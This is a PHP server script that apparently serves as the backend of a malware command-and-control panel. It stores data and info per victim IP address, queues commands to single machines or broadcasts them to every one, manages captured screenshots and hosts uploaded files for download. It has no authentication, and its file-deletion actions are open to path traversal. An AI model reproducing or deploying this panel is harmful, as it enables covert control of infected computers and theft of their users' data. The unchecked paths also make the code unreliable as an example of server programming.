<?php

//error_reporting(E_ALL);

$dir_data = '../data/';
$dir_cmds = '../commands/';
$dir_screenshots = '../screenshots/';
$dir_files = '../files/';
$dir_info = '../info/';

function pv($var) {
	if (!isset($_POST[$var])) die();
	return $_POST[$var];
}
function check_user($dir, $ip) {
	if (ip2long($ip) === false || !file_exists($dir.$ip))
		die();
}
function check_file($dir, $file) {
	$path = $dir.$file;
	if (!file_exists($path)) die();
}
function get_files($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	return array_values($files);
}
function get_users($dir) {
	$files = scandir($dir);
	$files = array_filter($files, function($f) {
		return $f[0] != '.';
	});
	$users = array();
	foreach ($files as $file) {
		$time = filemtime($dir.$file);
		$users[] = array($file, date("F d Y H:i:s", $time));
	}
	return $users;
}
function put_cmd($file, $cmd) {
	file_put_contents($file, file_get_contents($file) . $cmd . ';');
}

$req = pv('req');

if ($req === 'get_users') {
	$users = get_users($dir_data);
	echo json_encode($users);
}
else if ($req === 'get_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	echo file_get_contents($dir_data.$user);
}
else if ($req === 'clear_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	file_put_contents($dir_data.$user, '');
}
else if ($req === 'del_data') {
	$user = pv('user');
	check_user($dir_data, $user);
	
	unlink($dir_data.$user);
	unlink($dir_cmds.$user);
	unlink($dir_info.$user);
}
else if ($req === 'put_cmd') {
	$user = pv('user');
	$cmd  = pv('cmd');
	check_user($dir_data, $user);
	
	put_cmd($dir_cmds.$user, $cmd);
}
else if ($req === 'get_cmd') {
	$user = pv('user');
	check_user($dir_cmds, $user);
	
	echo file_get_contents($dir_cmds.$user);
}
else if ($req === 'clear_cmd') {
	$user = pv('user');
	check_user($dir_cmds, $user);
	
	file_put_contents($dir_cmds.$user, '');
}
else if ($req === 'put_cmd_all') {
	$cmd  = pv('cmd');
	
	$users = get_users($dir_data);
	foreach($users as $user) {
		put_cmd($dir_cmds.$user[0], $cmd);
	}
}
else if ($req === 'get_info') {
	$user = pv('user');
	check_user($dir_info, $user);
	
	echo file_get_contents($dir_info.$user);
}
else if ($req === 'clear_info') {
	$user = pv('user');
	check_user($dir_info, $user);
	
	file_put_contents($dir_info.$user, '');
}
else if ($req === 'list_screenshots') {
	$screenshots = get_files($dir_screenshots);
	echo json_encode($screenshots);
}
else if ($req === 'del_screenshot') {
	$file = pv('file');
	check_file($dir_screenshots, $file);
	
	$path = $dir_screenshots.$file;
	unlink($path);
}
else if ($req === 'list_files') {
	$files = get_files($dir_files);
	echo json_encode($files);
}
else if ($req === 'upload_file') {
	if (!isset($_FILES['file'])) die();
	
	$uploadfile = $dir_files.basename($_FILES['file']['name']);
	move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
}
else if ($req === 'del_file') {
	$file = pv('file');
	check_file($dir_files, $file);
	
	$path = $dir_files.$file;
	unlink($path);
}
?>